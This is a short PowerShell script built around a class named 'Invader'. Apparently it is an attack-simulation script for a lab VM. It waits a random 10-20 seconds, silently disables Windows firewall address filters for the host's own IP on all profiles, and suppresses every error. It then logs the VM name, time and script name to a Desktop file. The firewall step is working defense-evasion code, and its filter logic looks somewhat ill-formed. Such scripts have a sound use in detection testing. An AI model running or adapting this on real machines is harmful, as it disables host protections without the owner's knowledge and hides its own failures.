class Invader {
    [int32]$time

    Invader() {
    }

    # grab user
    [string] grabUser() {
        try {
            $unrefineduser = whoami.exe
            $userArr = $unrefineduser -split "\\"
            return $userArr[1]
        } catch {
            return $null
        }
    }

    # sleep for this amount of time
    sleep([int]$min, [int]$max) {
        try {
            $this.time = Get-Random -Minimum $min -Maximum $max
            Start-Sleep -Seconds $this.time
        } catch {
            # Silently handle the error without printing anything
        }
    }

    getLocalIPAddress() {
        try {
            $localIPAddress = [System.Net.Dns]::GetHostAddresses(($env:COMPUTERNAME)) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString -First 1
            return $localIPAddress
        } catch {
            return $null
        }
    }

    disableFirewallFilters() {
        try {
            $localIPAddress = $this.getLocalIPAddress()
            if ($localIPAddress -ne $null) {
                Set-NetFirewallAddressFilter -RemoteAddress $localIPAddress -Profile Domain, Public, Private -Enabled False
            }
        } catch {
            # Silently handle the error without printing anything
        }
    }
}

# create an instance of the Invader class
$Invade = New-Object -TypeName Invader

# perform actions
$Invade.sleep(10,20)
$Invade.disableFirewallFilters()

# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."